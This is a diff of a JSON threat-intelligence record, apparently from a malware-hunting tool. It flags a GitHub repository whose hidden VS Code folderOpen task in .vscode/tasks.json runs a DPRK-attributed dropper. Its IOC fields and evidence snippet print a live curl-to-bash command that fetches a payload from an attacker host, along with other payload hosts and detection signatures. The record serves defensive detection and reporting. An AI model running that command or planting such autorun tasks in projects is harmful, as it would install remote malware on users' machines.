@@ -4,25 +4,25 @@
     "kind": "repository",
     "family": "",
     "id": "123babayaga/zenithive_angular",
-    "url": "https://github.com/123babayaga/zenithive_angular",
+    "url": "https://github.com/123Babayaga/Zenithive_Angular",
     "registry": "github",
     "owner": "123babayaga",
     "status": "confirmed",
     "confidence": "auto",
     "score": 6,
-    "detection_method": "osm_repository",
-    "attribution": "dprk (north korea)",
+    "detection_method": "signature_match",
+    "attribution": "",
     "campaign_id": "GW-C-498a0aeb",
     "rules": "install_hook/vscode-autorun",
     "evidence_locations": ".vscode/tasks.json:0",
     "c2_hosts": "default-configuration.vercel.app",
     "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
-    "matched_signatures": "",
-    "reasons": "OSM-flagged malicious repository (severity CRITICAL) [DPRK (North Korea) (per OSM)]: DPRK Contagious Interview campaign using VS Code tasks.json. Executes a malicious payload through a runOn: folderOpen task or Git hooks when the project is open | Tier-2 confirmed (bash score 5)",
+    "matched_signatures": "settings/win?flag=; folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['settings/win?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260929T023651Z",
-    "last_seen": "hunt-20260929T023651Z",
+    "first_seen": "hunt-20261005T094859Z",
+    "last_seen": "hunt-20261005T094859Z",
     "evidence_file": "repositories/123babayaga_zenithive_angular.json",
     "reviewer_decision": "",
     "notes": ""
@@ -43,12 +43,12 @@
       "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
     }
   ],
-  "commit_sha": "869da25571184d801312d8d8ae425c6faec49734",
+  "commit_sha": "0c5d6f20f2f8fe5e13037f347c799dfd00d2ea5c",
   "osm_report": {
     "report_type": "repository",
     "resource_identifier": "https://github.com/123babayaga/zenithive_angular",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app; Corroboration (not counted toward attribution): OSM/news already names dprk (north korea).\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/win?flag=; folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: default-configuration.vercel.app",
     "publisher": "123babayaga",
     "severity_level": "critical",
@@ -63,10 +63,10 @@
       "vscode-folderopen-autorun",
       "dropper"
     ],
-    "evidence_references": "https://github.com/123babayaga/zenithive_angular/blob/869da25571184d801312d8d8ae425c6faec49734/.vscode/tasks.json",
+    "evidence_references": "https://github.com/123babayaga/zenithive_angular/blob/0c5d6f20f2f8fe5e13037f347c799dfd00d2ea5c/.vscode/tasks.json",
     "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-29T02:36:51Z",
-    "last_seen": "2026-09-29T02:36:51Z"
+    "first_seen": "2026-10-05T09:48:59Z",
+    "last_seen": "2026-10-05T09:48:59Z"
   }
 }
